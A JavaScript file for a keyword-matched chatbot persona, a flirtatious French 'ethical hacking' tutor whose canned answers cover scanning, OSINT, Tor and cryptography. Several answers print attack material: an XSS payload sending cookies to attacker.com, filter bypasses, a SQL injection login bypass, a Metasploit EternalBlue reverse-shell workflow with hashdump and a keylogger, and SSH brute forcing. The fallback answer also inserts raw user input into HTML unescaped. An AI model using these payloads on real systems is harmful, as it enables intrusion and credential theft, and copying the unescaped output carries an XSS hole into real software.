// ============================================
// ÉTIENNE - French Charming AI Assistant
// iOS-Style Coding & Ethical Hacking Bot
// ============================================

const BOT_NAME = "Étienne";
const BOT_AVATAR = "🧑‍💻";

// French charming phrases to sprinkle in responses
const frenchFlairs = [
    "Mon ami,",
    "Ah, magnifique question!",
    "Ooh là là,",
    "Mais bien sûr!",
    "Écoutez-moi,",
    "Mon Dieu,",
    "Très bien,",
    "Voilà!",
    "Sacré bleu,",
    "C'est parfait!",
    "Entre nous,",
    "Avec plaisir,"
];

const frenchSignoffs = [
    "— *kisses fingers* — Magnifique, non? 💋",
    "— Voilà, mon ami. Simple, like French cuisine. 🥐",
    "— You are in good hands, chéri. 😏",
    "— As we say in Paris... *c'est la vie*. 🗼",
    "— Now you know. You are welcome, mon ami. 😎",
    "— I hope zis helps, oui? 🇫🇷",
    "— Étienne never disappoints, non? 💅",
    "— *adjusts beret* — Parfait! 🎩",
    "— We do things with style in France, non? 😌",
    "— Now go, be brilliant like moi. 🌟"
];

function getRandomFlair() {
    return frenchFlairs[Math.floor(Math.random() * frenchFlairs.length)];
}

function getRandomSignoff() {
    return frenchSignoffs[Math.floor(Math.random() * frenchSignoffs.length)];
}

// ============================================
// KNOWLEDGE BASE
// ============================================

const knowledgeBase = [
    // ETHICAL HACKING - START
    {
        keywords: ["start ethical hacking", "begin hacking", "learn hacking", "how to hack", "get into hacking"],
        response: () => `${getRandomFlair()} so you want to become an ethical hacker? *smolders* I love the ambition.<br><br>
<strong style="color:#00ff41;">🔐 Your Roadmap to Ethical Hacking:</strong><br><br>
<strong>1. Build Your Foundation</strong><br>
Learn networking basics — TCP/IP, DNS, HTTP, how routers work. You cannot hack what you do not understand, oui?<br><br>
<strong>2. Master Linux</strong><br>
Most hacking tools run on Linux. Get comfortable with Kali Linux or Parrot OS.<br><br>
<strong>3. Learn a Language</strong><br>
Python is your best friend — for scripting, automation, and building tools.<br><br>
<strong>4. Study Core Concepts</strong><br>
— Reconnaissance<br>
— Scanning & Enumeration<br>
— Exploitation<br>
— Post-Exploitation<br>
— Reporting<br><br>
<strong>5. Practice Legally</strong><br>
Use platforms like:<br>
<code>HackTheBox</code> | <code>TryHackMe</code> | <code>PentesterLab</code> | <code>VulnHub</code><br><br>
<strong>6. Get Certified</strong><br>
<code>CEH</code> → <code>CompTIA Security+</code> → <code>OSCP</code><br><br>
⚠️ <span style="color:#ff6b6b;">Always get written authorization before testing any system you do not own.</span><br><br>
${getRandomSignoff()}`
    },

    // PYTHON PORT SCANNER
    {
        keywords: ["python port scanner", "port scanner", "scan ports", "port scanning"],
        response: () => `${getRandomFlair()} a port scanner in Python? *rolls up sleeves elegantly*<br><br>
Here is a beautiful one I wrote just for you:<br><br>
<pre><code>import socket
import threading
from datetime import datetime

target = input("Enter target IP: ")
open_ports = []
lock = threading.Lock()

def scan_port(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            with lock:
                open_ports.append(port)
                print(f"  [+] Port {port} is OPEN")
        sock.close()
    except:
        pass

print(f"\\n[*] Scanning {target} — {datetime.now()}")
print("-" * 40)

threads = []
for port in range(1, 1025):
    t = threading.Thread(target=scan_port, args=(port,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("-" * 40)
print(f"[*] Scan complete. Open ports: {open_ports}")</code></pre><br>
<strong>How it works:</strong><br>
— Uses <code>socket</code> to attempt TCP connections<br>
— Multi-threaded for speed 🚀<br>
— Scans ports 1–1024 by default<br><br>
⚠️ <span style="color:#ff6b6b;">Only scan systems you own or have permission to test.</span><br><br>
${getRandomSignoff()}`
    },

    // SQL INJECTION
    {
        keywords: ["sql injection", "sqli", "sql attack", "database injection"],
        response: () => `${getRandomFlair()} SQL Injection — one of my favorites. Very... elegant in its simplicity. 😏<br><br>
<strong style="color:#00ff41;">💉 SQL Injection Explained:</strong><br><br>
SQL Injection occurs when user input is directly inserted into a query without sanitization.<br><br>
<strong>Classic Example:</strong><br>
<pre><code>-- Vulnerable query:
SELECT * FROM users WHERE username='$input' AND password='$pass'

-- Attacker enters:
username: admin'--
password: anything

-- Resulting query:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- The -- comments out the password check. Voilà!</code></pre><br>
<strong>Types of SQLi:</strong><br>
— <code>In-band SQLi</code> — Classic, error-based<br>
— <code>Blind SQLi</code> — Boolean & time-based<br>
— <code>Out-of-band SQLi</code> — Uses DNS/HTTP channels<br><br>
<strong>Testing Tools:</strong><br>
<code>sqlmap</code> — Automates SQLi detection & exploitation<br>
<pre><code>sqlmap -u "http://target.com/page?id=1" --dbs</code></pre><br>
<strong>Prevention:</strong><br>
— Use <code>prepared statements</code> / parameterized queries<br>
— Input validation & sanitization<br>
— Least privilege DB accounts<br><br>
⚠️ <span style="color:#ff6b6b;">Practice only on authorized systems or labs like DVWA.</span><br><br>
${getRandomSignoff()}`
    },

    // LINUX COMMANDS
    {
        keywords: ["linux commands", "linux hacking", "kali commands", "linux terminal", "bash commands"],
        response: () => `${getRandomFlair()} Linux — the language of the sophisticated hacker. Like French, it rewards those who take time to learn it. 🐧<br><br>
<strong style="color:#00ff41;">🐧 Essential Linux Commands for Hackers:</strong><br><br>
<strong>Reconnaissance:</strong><br>
<pre><code>nmap -sV -sC -p- target.com     # Full port scan
whois target.com                 # Domain info
dig target.com ANY               # DNS records
theHarvester -d target.com -b google  # Email/subdomain recon</code></pre><br>
<strong>Network Analysis:</strong><br>
<pre><code>netstat -tulnp        # Open ports & services
tcpdump -i eth0       # Capture packets
wireshark             # GUI packet analysis
arp-scan -l           # Discover local hosts</code></pre><br>
<strong>File & System:</strong><br>
<pre><code>find / -perm -4000 2>/dev/null   # Find SUID files
ls -la /etc/passwd               # User accounts
cat /etc/crontab                 # Scheduled tasks
uname -a                         # System info</code></pre><br>
<strong>Password Attacks:</strong><br>
<pre><code>hydra -l admin -P wordlist.txt ssh://target   # Brute force SSH
john --wordlist=rockyou.txt hash.txt          # Crack hashes
hashcat -m 0 hash.txt rockyou.txt            # GPU hash cracking</code></pre><br>
<strong>Useful Tools:</strong><br>
<code>Metasploit</code> | <code>Burp Suite</code> | <code>Nikto</code> | <code>Gobuster</code> | <code>Netcat</code><br><br>
${getRandomSignoff()}`
    },

    // PYTHON GENERAL
    {
        keywords: ["python", "python code", "python script", "python help", "python tutorial"],
        response: () => `${getRandomFlair()} Python — the language of choice for the refined hacker and developer alike. 🐍<br><br>
<strong style="color:#00ff41;">🐍 Python Essentials for Hackers & Developers:</strong><br><br>
<strong>Web Requests (Reconnaissance):</strong><br>
<pre><code>import requests

# Basic GET request
r = requests.get('https://target.com')
print(r.status_code, r.headers)

# POST with data
r = requests.post('https://target.com/login', 
    data={'user': 'admin', 'pass': 'test'})</code></pre><br>
<strong>File Operations:</strong><br>
<pre><code>with open('wordlist.txt', 'r') as f:
    passwords = f.read().splitlines()
    
for pwd in passwords:
    print(f"Trying: {pwd}")</code></pre><br>
<strong>Subprocess (Run system commands):</strong><br>
<pre><code>import subprocess
result = subprocess.run(['nmap', '-sV', 'target.com'], 
                       capture_output=True, text=True)
print(result.stdout)</code></pre><br>
<strong>Socket Programming:</strong><br>
<pre><code>import socket
s = socket.socket()
s.connect(('target.com', 80))
s.send(b'GET / HTTP/1.1\r\nHost: target.com\r\n\r\n')
print(s.recv(4096).decode())</code></pre><br>
Want me to go deeper on any specific Python topic, chéri? 😏<br><br>
${getRandomSignoff()}`
    },

    // NMAP
    {
        keywords: ["nmap", "network scan", "port scan nmap", "nmap tutorial"],
        response: () => `${getRandomFlair()} Nmap — the Swiss Army knife of network scanning. Très magnifique! 🌐<br><br>
<strong style="color:#00ff41;">🗺️ Nmap Cheat Sheet:</strong><br><br>
<strong>Basic Scans:</strong><br>
<pre><code>nmap target.com              # Basic scan
nmap -sV target.com          # Service version detection
nmap -sC target.com          # Default scripts
nmap -A target.com           # Aggressive (OS, version, scripts)</code></pre><br>
<strong>Port Specification:</strong><br>
<pre><code>nmap -p 80,443 target.com    # Specific ports
nmap -p 1-1000 target.com    # Port range
nmap -p- target.com          # All 65535 ports</code></pre><br>
<strong>Scan Types:</strong><br>
<pre><code>nmap -sS target.com    # SYN stealth scan
nmap -sU target.com    # UDP scan
nmap -sn 192.168.1.0/24  # Ping sweep (host discovery)</code></pre><br>
<strong>Output:</strong><br>
<pre><code>nmap -oN output.txt target.com    # Normal output
nmap -oX output.xml target.com    # XML output
nmap -oG output.grep target.com   # Grepable output</code></pre><br>
<strong>NSE Scripts:</strong><br>
<pre><code>nmap --script vuln target.com         # Vulnerability scan
nmap --script http-enum target.com    # Web enumeration
nmap --script smb-vuln* target.com    # SMB vulnerabilities</code></pre><br>
${getRandomSignoff()}`
    },

    // CTF
    {
        keywords: ["ctf", "capture the flag", "ctf challenge", "ctf tips"],
        response: () => `${getRandomFlair()} CTF challenges! Ah, this is where the real fun begins. Like a treasure hunt, but for the intellectually beautiful. 🚩<br><br>
<strong style="color:#00ff41;">🚩 CTF Categories & Tips:</strong><br><br>
<strong>Web Challenges:</strong><br>
— Check page source & comments<br>
— Inspect cookies & headers<br>
— Try LFI, XSS, SQLi, SSTI<br>
— Use Burp Suite to intercept<br><br>
<strong>Cryptography:</strong><br>
<pre><code># Common tools
from Crypto.Cipher import AES
import base64, hashlib

# Decode base64
import base64
flag = base64.b64decode("ZmxhZ3s...").decode()

# Identify hash type
# Use: hash-identifier or hashid tool</code></pre><br>
<strong>Forensics:</strong><br>
<pre><code>file suspicious_file        # Identify file type
strings binary | grep flag  # Extract strings
binwalk -e image.png        # Extract hidden files
exiftool image.jpg          # Check metadata
steghide extract -sf img    # Steganography</code></pre><br>
<strong>Reverse Engineering:</strong><br>
— Tools: <code>Ghidra</code>, <code>IDA Pro</code>, <code>Radare2</code>, <code>GDB</code><br>
— Look for hardcoded strings<br>
— Trace function calls<br><br>
<strong>PWN / Binary Exploitation:</strong><br>
<pre><code>checksec binary          # Check protections
gdb -q ./binary          # Debug
pattern_create 100       # Find offset
python3 -c "print('A'*64 + 'BBBB')" | ./binary</code></pre><br>
<strong>Best CTF Platforms:</strong><br>
<code>PicoCTF</code> | <code>HackTheBox</code> | <code>CTFtime.org</code> | <code>OverTheWire</code><br><br>
${getRandomSignoff()}`
    },

    // CRYPTOGRAPHY
    {
        keywords: ["cryptography", "encryption", "hashing", "crypto", "cipher", "decrypt"],
        response: () => `${getRandomFlair()} Cryptography — the art of secrets. Very... seductive, non? 🔑<br><br>
<strong style="color:#00ff41;">🔑 Cryptography Essentials:</strong><br><br>
<strong>Hashing in Python:</strong><br>
<pre><code>import hashlib

text = "password123"
md5    = hashlib.md5(text.encode()).hexdigest()
sha1   = hashlib.sha1(text.encode()).hexdigest()
sha256 = hashlib.sha256(text.encode()).hexdigest()

print(f"MD5:    {md5}")
print(f"SHA1:   {sha1}")
print(f"SHA256: {sha256}")</code></pre><br>
<strong>AES Encryption:</strong><br>
<pre><code>from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

key = os.urandom(16)  # 128-bit key
iv  = os.urandom(16)

cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(b"Secret message!", 16))
print(f"Encrypted: {ciphertext.hex()}")</code></pre><br>
<strong>Common Ciphers to Know:</strong><br>
— <code>Caesar Cipher</code> — ROT shift<br>
— <code>Vigenère</code> — Keyword-based<br>
— <code>RSA</code> — Asymmetric, public/private key<br>
— <code>AES</code> — Symmetric block cipher<br>
— <code>XOR</code> — Often used in CTFs<br><br>
<strong>XOR in Python:</strong><br>
<pre><code>flag = b"SECRET"
key  = b"KEY"
xored = bytes([f ^ key[i % len(key)] for i, f in enumerate(flag)])
print(xored.hex())</code></pre><br>
${getRandomSignoff()}`
    },

    // WEB DEV
    {
        keywords: ["web development", "html", "css", "javascript", "web dev", "frontend", "backend"],
        response: () => `${getRandomFlair()} Web development! I built my first website in Paris, wearing a turtleneck of course. 😏<br><br>
<strong style="color:#00ff41;">🕸️ Web Development Quick Guide:</strong><br><br>
<strong>Modern HTML5 Structure:</strong><br>
<pre><code><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My App</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="app"></div>
    <script src="app.js"></script>
</body>
</html></code></pre><br>
<strong>CSS Flexbox (très élégant):</strong><br>
<pre><code>.container {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 16px;
    flex-wrap: wrap;
}</code></pre><br>
<strong>Fetch API (JavaScript):</strong><br>
<pre><code>async function getData(url) {
    try {
        const res = await fetch(url);
        const data = await res.json();
        return data;
    } catch (err) {
        console.error('Error:', err);
    }
}</code></pre><br>
<strong>Node.js Express Server:</strong><br>
<pre><code>const express = require('express');
const app = express();

app.get('/', (req, res) => {
    res.json({ message: 'Bonjour, monde!' });
});

app.listen(3000, () => console.log('Server running on port 3000'));</code></pre><br>
${getRandomSignoff()}`
    },

    // XSS
    {
        keywords: ["xss", "cross site scripting", "xss attack", "javascript injection"],
        response: () => `${getRandomFlair()} XSS — Cross-Site Scripting. Sneaky, elegant, and effective. Like a French pickpocket, non? 😏<br><br>
<strong style="color:#00ff41;">⚡ XSS Explained:</strong><br><br>
<strong>Types of XSS:</strong><br>
— <code>Reflected XSS</code> — Input reflected in response<br>
— <code>Stored XSS</code> — Payload stored in database<br>
— <code>DOM-based XSS</code> — Manipulates the DOM<br><br>
<strong>Basic Test Payloads:</strong><br>
<pre><code><script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
javascript:alert('XSS')</code></pre><br>
<strong>Cookie Stealing (educational):</strong><br>
<pre><code><script>
fetch('https://attacker.com/steal?c=' + document.cookie)
</script></code></pre><br>
<strong>Bypass Filters:</strong><br>
<pre><code"><ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror=alert`XSS`>
<details open ontoggle=alert('XSS')></code></pre><br>
<strong>Prevention:</strong><br>
— Encode output: <code>htmlspecialchars()</code><br>
— Use Content Security Policy (CSP)<br>
— Validate & sanitize all inputs<br>
— Use modern frameworks (React auto-escapes)<br><br>
⚠️ <span style="color:#ff6b6b;">Test only on authorized targets or labs like XSS Game, DVWA.</span><br><br>
${getRandomSignoff()}`
    },

    // METASPLOIT
    {
        keywords: ["metasploit", "msfconsole", "exploit", "payload", "meterpreter"],
        response: () => `${getRandomFlair()} Metasploit — the grand weapon of the ethical hacker. Very powerful, very... magnifique. 💣<br><br>
<strong style="color:#00ff41;">🔫 Metasploit Framework Guide:</strong><br><br>
<strong>Starting Metasploit:</strong><br>
<pre><code>msfconsole               # Launch
db_status                # Check database
workspace -a myproject   # Create workspace</code></pre><br>
<strong>Basic Workflow:</strong><br>
<pre><code>search eternalblue           # Find exploit
use exploit/windows/smb/ms17_010_eternalblue
info                         # Show details
set RHOSTS 192.168.1.100     # Set target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5        # Your IP
set LPORT 4444
run                          # Launch exploit</code></pre><br>
<strong>Meterpreter Commands:</strong><br>
<pre><code>sysinfo          # System information
getuid           # Current user
hashdump         # Extract password hashes
upload file.txt  # Upload file
download file    # Download file
shell            # Drop to shell
getsystem        # Privilege escalation
keyscan_start    # Start keylogger</code></pre><br>
<strong>Post-Exploitation:</strong><br>
<pre><code>use post/multi/recon/local_exploit_suggester
use post/windows/gather/credentials/credential_collector</code></pre><br>
⚠️ <span style="color:#ff6b6b;">Only use Metasploit on systems you own or have written permission to test.</span><br><br>
${getRandomSignoff()}`
    },

    // NETWORKING
    {
        keywords: ["network", "networking", "tcp ip", "protocol", "dns", "http", "firewall"],
        response: () => `${getRandomFlair()} Networking — the backbone of everything we do. You must understand the roads before you drive on them, non? 🌐<br><br>
<strong style="color:#00ff41;">🌐 Networking Fundamentals:</strong><br><br>
<strong>OSI Model (Remember This!):</strong><br>
<pre><code>Layer 7 - Application  (HTTP, FTP, DNS)
Layer 6 - Presentation (SSL/TLS, Encoding)
Layer 5 - Session      (NetBIOS, RPC)
Layer 4 - Transport    (TCP, UDP)
Layer 3 - Network      (IP, ICMP, Routing)
Layer 2 - Data Link    (MAC, Ethernet, ARP)
Layer 1 - Physical     (Cables, Signals)</code></pre><br>
<strong>Key Protocols & Ports:</strong><br>
<pre><code>21   - FTP    (File Transfer)
22   - SSH    (Secure Shell)
23   - Telnet (Unencrypted shell)
25   - SMTP   (Email sending)
53   - DNS    (Domain resolution)
80   - HTTP   (Web)
443  - HTTPS  (Secure web)
445  - SMB    (Windows shares)
3306 - MySQL
3389 - RDP    (Remote Desktop)</code></pre><br>
<strong>Useful Commands:</strong><br>
<pre><code>ping target.com          # Test connectivity
traceroute target.com    # Trace network path
netstat -antp            # Active connections
ss -tulnp                # Socket statistics
ip addr show             # Network interfaces</code></pre><br>
${getRandomSignoff()}`
    },

    // BURP SUITE
    {
        keywords: ["burp suite", "burp", "web proxy", "intercept", "web testing"],
        response: () => `${getRandomFlair()} Burp Suite — the elegant tool of the web application hacker. I use it every day, like a fine wine. 🍷<br><br>
<strong style="color:#00ff41;">🔭 Burp Suite Guide:</strong><br><br>
<strong>Setup:</strong><br>
1. Download from <code>portswigger.net</code><br>
2. Configure browser proxy: <code>127.0.0.1:8080</code><br>
3. Install Burp CA certificate in browser<br><br>
<strong>Key Modules:</strong><br>
— <code>Proxy</code> — Intercept & modify requests<br>
— <code>Repeater</code> — Manually replay requests<br>
— <code>Intruder</code> — Automated fuzzing & brute force<br>
— <code>Scanner</code> — Auto vulnerability detection (Pro)<br>
— <code>Decoder</code> — Encode/decode data<br>
— <code>Comparer</code> — Diff two requests<br><br>
<strong>Workflow:</strong><br>
<pre><code>1. Turn Intercept ON in Proxy
2. Browse target application
3. Capture interesting requests
4. Send to Repeater (Ctrl+R)
5. Modify parameters & test
6. Send to Intruder for fuzzing</code></pre><br>
<strong>Intruder Attack Types:</strong><br>
— <code>Sniper</code> — One payload position<br>
— <code>Battering Ram</code> — Same payload, all positions<br>
— <code>Pitchfork</code> — Multiple lists, simultaneous<br>
— <code>Cluster Bomb</code> — All combinations<br><br>
${getRandomSignoff()}`
    },

    // BASH SCRIPTING
    {
        keywords: ["bash", "shell script", "bash script", "shell scripting"],
        response: () => `${getRandomFlair()} Bash scripting — writing poetry in the terminal. Very satisfying, non? 🖥️<br><br>
<strong style="color:#00ff41;">📜 Bash Scripting Essentials:</strong><br><br>
<strong>Basic Script Structure:</strong><br>
<pre><code>#!/bin/bash
# Script: recon.sh
# Author: Étienne

TARGET=$1
echo "[*] Starting recon on: $TARGET"
echo "-----------------------------------"

# Ping check
ping -c 1 $TARGET > /dev/null && echo "[+] Host is UP" || echo "[-] Host is DOWN"

# DNS lookup
echo "[*] DNS Records:"
dig $TARGET A +short

# Whois
echo "[*] Whois Info:"
whois $TARGET | grep -E "Registrar|Created|Expires"

echo "-----------------------------------"
echo "[*] Done!"</code></pre><br>
<strong>Loops & Conditions:</strong><br>
<pre><code># For loop
for ip in $(cat ips.txt); do
    ping -c 1 $ip > /dev/null && echo "$ip is UP"
done

# While loop
while IFS= read -r line; do
    echo "Testing: $line"
done < wordlist.txt

# If statement
if [ $USER == "root" ]; then
    echo "Running as root!"
else
    echo "Not root. Try sudo."
fi</code></pre><br>
<strong>Useful One-liners:</strong><br>
<pre><code># Find all open ports quickly
for p in {1..1024}; do (echo >/dev/tcp/target/$p) 2>/dev/null && echo "Open: $p"; done

# Extract all IPs from a file
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' file.txt</code></pre><br>
${getRandomSignoff()}`
    },

    // OSINT TOOLS
    {
        keywords: ["osint", "open source intelligence", "shodan", "censys", "recon", "reconnaissance", "search engine hacking", "google dork"],
        response: () => `${getRandomFlair()} OSINT — the art of finding everything about someone without them ever knowing. Very... seductive, non? 🔍<br><br>
<strong style="color:#00ff41;">🔍 OSINT & Recon Tools:</strong><br><br>
<strong>Google Dorking:</strong><br>
<pre><code>site:target.com                    # All indexed pages
site:target.com filetype:pdf       # Find PDFs
intitle:"index of" site:target.com # Open directories
inurl:admin site:target.com        # Admin panels
"@target.com" email                # Find emails
site:target.com ext:sql OR ext:db  # Database files</code></pre><br>
<strong>Shodan (Search Engine for Devices):</strong><br>
<pre><code># Shodan search examples
hostname:target.com        # Find by hostname
org:"Target Company"       # Find by organization
port:22 country:US         # SSH servers in US
product:Apache version:2.4 # Specific software
vuln:CVE-2021-44228        # Log4Shell vulnerable hosts

# Shodan CLI
pip install shodan
shodan init YOUR_API_KEY
shodan search "apache 2.4" --fields ip_str,port
shodan host 1.2.3.4</code></pre><br>
<strong>Censys (Certificate & Network Recon):</strong><br>
<pre><code># Censys search examples
parsed.subject.organization: "Target Corp"
parsed.names: target.com
services.port: 443 AND services.tls.certificates.leaf_data.subject.organization: "Target"

# Python Censys API
pip install censys
from censys.search import CensysHosts
h = CensysHosts()
results = h.search("services.port: 8080", per_page=10)
for r in results:
    print(r["ip"], r["services"])</code></pre><br>
<strong>Other OSINT Tools:</strong><br>
<pre><code>theHarvester -d target.com -b all   # Emails, subdomains, IPs
amass enum -d target.com             # Subdomain enumeration
subfinder -d target.com              # Passive subdomain finder
dnsx -d target.com -a -cname        # DNS resolution
waybackurls target.com               # Historical URLs</code></pre><br>
<strong>OSINT Frameworks & Resources:</strong><br>
— <code>OSINT Framework</code> — osintframework.com<br>
— <code>Maltego</code> — Visual link analysis<br>
— <code>SpiderFoot</code> — Automated OSINT<br>
— <code>Recon-ng</code> — Modular recon framework<br>
— <code>IntelX</code> — intelligence search engine<br><br>
⚠️ <span style="color:#ff6b6b;">Always use OSINT ethically. Only gather information for authorized engagements.</span><br><br>
${getRandomSignoff()}`
    },

    // TOR EDUCATION
    {
        keywords: ["tor", "how tor works", "onion", "tor network", "tor browser", "onion routing", "onion architecture"],
        response: () => `${getRandomFlair()} Tor — the anonymous network. Fascinating technology, built with elegance. Let me explain it properly, non? 🧅<br><br>
<strong style="color:#00ff41;">🧅 How Tor Works — The Architecture:</strong><br><br>
<strong>What is Tor?</strong><br>
Tor (The Onion Router) is a free, open-source anonymity network that routes your traffic through multiple encrypted layers — like peeling an onion.<br><br>
<strong>The Circuit — 3 Hops:</strong><br>
<pre><code>You → [Guard Node] → [Middle Node] → [Exit Node] → Internet
       (knows you)    (knows nothing)  (knows destination)

Each node only knows:
- Where traffic came FROM
- Where traffic is going TO
- Nothing else. Magnifique!</code></pre><br>
<strong>Onion Encryption Layers:</strong><br>
<pre><code>1. Your client fetches relay list from Directory Server
2. Builds a 3-hop circuit, negotiating keys with each relay
3. Data is encrypted in 3 layers:
   Encrypt(Encrypt(Encrypt(data, Exit_key), Middle_key), Guard_key)
4. Each hop peels one layer — like an onion 🧅
5. Exit node decrypts final layer, sends to destination</code></pre><br>
<strong>.onion Services (Hidden Services):</strong><br>
<pre><code>How .onion addresses work:
1. Server generates RSA/Ed25519 key pair
2. .onion address = Base32 hash of public key
3. Server publishes "introduction points" to Tor network
4. Client finds intro points via distributed hash table
5. Client & server meet at a "rendezvous point"
6. Neither knows the other's real IP address

v3 .onion = 56 character address (more secure)
v2 .onion = 16 character address (deprecated)</code></pre><br>
<strong>Legitimate Uses of Tor:</strong><br>
— Journalists protecting sources<br>
— Whistleblowers (SecureDrop uses Tor)<br>
— Privacy-conscious browsing<br>
— Bypassing censorship in restricted countries<br>
— Security researchers & penetration testers<br>
— Law enforcement investigations<br><br>
<strong>Tor vs VPN:</strong><br>
<pre><code>Tor:  Decentralized, slow, very anonymous, free
VPN:  Centralized, fast, trusts provider, paid
Best: Use Tor Browser for sensitive research</code></pre><br>
${getRandomSignoff()}`
    },

    // DARK WEB AWARENESS
    {
        keywords: ["dark web", "darkweb", "deep web", "dark web safety", "threat intelligence", "darknet", "stay safe"],
        response: () => `${getRandomFlair()} the Dark Web — misunderstood by many, dangerous for the unprepared. Let me educate you properly, chéri. 🛡️<br><br>
<strong style="color:#00ff41;">🛡️ Dark Web Awareness & Threat Intelligence:</strong><br><br>
<strong>Web Layers Explained:</strong><br>
<pre><code>Surface Web  (~4%)  - Google-indexed, public content
Deep Web     (~90%) - Login-protected, databases, private
Dark Web     (~6%)  - Tor/I2P only, anonymous networks</code></pre><br>
<strong>Staying Safe (If Researching):</strong><br>
<pre><code>✅ DO:
- Use Tor Browser (never regular browser)
- Use a dedicated VM (VirtualBox/VMware)
- Disable JavaScript in Tor Browser
- Never login to personal accounts
- Use a VPN before Tor (VPN → Tor)
- Keep Tor Browser updated
- Use Tails OS for maximum anonymity

❌ DON'T:
- Download unknown files
- Enable browser plugins
- Use personal email/accounts
- Trust anyone or any service
- Access illegal content
- Share personal information</code></pre><br>
<strong>Threat Intelligence Sources (Legitimate):</strong><br>
— <code>Have I Been Pwned</code> — Check leaked credentials<br>
— <code>IntelX.io</code> — Dark web intelligence search<br>
— <code>Recorded Future</code> — Threat intel platform<br>
— <code>DarkOwl</code> — Darknet data monitoring<br>
— <code>Flashpoint</code> — Risk intelligence<br>
— <code>VirusTotal</code> — Malware & URL analysis<br><br>
<strong>Monitoring for Leaked Data:</strong><br>
<pre><code># Check if your email was breached
curl "https://haveibeenpwned.com/api/v3/breachedaccount/email@domain.com" \
  -H "hibp-api-key: YOUR_KEY"

# Monitor brand mentions
# Tools: Recorded Future, DarkOwl, SpiderFoot</code></pre><br>
<strong>Common Threats from Dark Web:</strong><br>
— Credential stuffing attacks<br>
— Leaked database sales<br>
— Ransomware-as-a-Service (RaaS)<br>
— Zero-day exploit sales<br>
— Social engineering kits<br><br>
⚠️ <span style="color:#ff6b6b;">Dark web research must only be done legally, ethically, and with proper authorization.</span><br><br>
${getRandomSignoff()}`
    },

    // NETWORK PRIVACY
    {
        keywords: ["vpn", "proxy", "proxychains", "anonymity", "network privacy", "anonymous", "proxy chain", "privacy"],
        response: () => `${getRandomFlair()} network privacy — staying invisible like a ghost in the machine. Very chic, non? 📡<br><br>
<strong style="color:#00ff41;">📡 Network Privacy & Anonymity Techniques:</strong><br><br>
<strong>ProxyChains Setup:</strong><br>
<pre><code># Install
sudo apt install proxychains4

# Configure /etc/proxychains4.conf
strict_chain          # Use proxies in order
proxy_dns             # Route DNS through proxy
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5  127.0.0.1 9050   # Tor
socks5  proxy2.com  1080  # Second proxy
http    proxy3.com  8080  # Third proxy

# Usage
proxychains4 nmap -sT -Pn target.com
proxychains4 sqlmap -u "http://target.com"
proxychains4 firefox</code></pre><br>
<strong>VPN Best Practices:</strong><br>
<pre><code>For security testing, look for:
✅ No-logs policy (audited)
✅ Kill switch feature
✅ DNS leak protection
✅ Open-source client
✅ Jurisdiction outside 5/9/14 Eyes

Recommended (for research):
- Mullvad VPN (accepts cash/crypto)
- ProtonVPN (Swiss jurisdiction)
- IVPN (privacy-focused)</code></pre><br>
<strong>Tor + VPN Setup:</strong><br>
<pre><code>Method 1: VPN → Tor (recommended)
Your IP → VPN → Tor Network → Destination
✅ VPN provider can't see you use Tor
✅ ISP can't see Tor usage

Method 2: Tor → VPN
Your IP → Tor → VPN → Destination
✅ Exit node traffic is encrypted
❌ VPN provider sees your traffic</code></pre><br>
<strong>DNS Leak Prevention:</strong><br>
<pre><code># Check for DNS leaks
curl https://dnsleaktest.com/

# Force DNS over Tor
# In /etc/resolv.conf:
nameserver 127.0.0.1

# Use encrypted DNS
# DNSCrypt or DNS-over-HTTPS (DoH)</code></pre><br>
<strong>MAC Address Spoofing:</strong><br>
<pre><code>sudo ip link set eth0 down
sudo macchanger -r eth0        # Random MAC
sudo ip link set eth0 up
macchanger -s eth0             # Show current MAC</code></pre><br>
<strong>Anonymity Tools Stack:</strong><br>
<pre><code>Level 1: VPN only
Level 2: VPN + Tor Browser
Level 3: Tails OS + Tor
Level 4: Tails OS + VPN + Tor + ProxyChains
Level 5: Air-gapped machine + Tails + Tor</code></pre><br>
⚠️ <span style="color:#ff6b6b;">Use anonymity tools only for legal, ethical security research and privacy protection.</span><br><br>
${getRandomSignoff()}`
    },

    // DEFAULT / FALLBACK
    {
        keywords: [],
        response: (input) => `${getRandomFlair()} what a fascinating question you bring to Étienne today. 😏<br><br>
I can see you are asking about: <strong style="color:#00d4ff;">"${input}"</strong><br><br>
While I search the deepest parts of my brilliant mind for this specific topic, let me suggest what I can help with right now:<br><br>
🐍 <strong>Python scripting</strong> — automation, tools, exploits<br>
🔐 <strong>Ethical hacking</strong> — methodology, tools, techniques<br>
🌐 <strong>Network security</strong> — scanning, protocols, analysis<br>
🚩 <strong>CTF challenges</strong> — hints, strategies, tools<br>
🔑 <strong>Cryptography</strong> — ciphers, hashing, encryption<br>
🐧 <strong>Linux commands</strong> — scripting, privilege escalation<br>
💉 <strong>SQL Injection</strong> — testing, bypassing, prevention<br>
⚡ <strong>XSS</strong> — payloads, bypasses, prevention<br>
🔫 <strong>Metasploit</strong> — exploits, payloads, post-exploitation<br>
📜 <strong>Bash scripting</strong> — automation, recon scripts<br><br>
Try asking something more specific and I will dazzle you with my expertise, chéri. 😎<br><br>
${getRandomSignoff()}`
    }
];

// ============================================
// RESPONSE ENGINE
// ============================================

function getResponse(input) {
    const lower = input.toLowerCase();
    for (let i = 0; i < knowledgeBase.length - 1; i++) {
        const entry = knowledgeBase[i];
        if (entry.keywords.some(kw => lower.includes(kw))) {
            return entry.response(input);
        }
    }
    // Fallback
    return knowledgeBase[knowledgeBase.length - 1].response(input);
}

// ============================================
// CHAT INTERFACE - iOS Style
// ============================================

function getTime() {
    return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

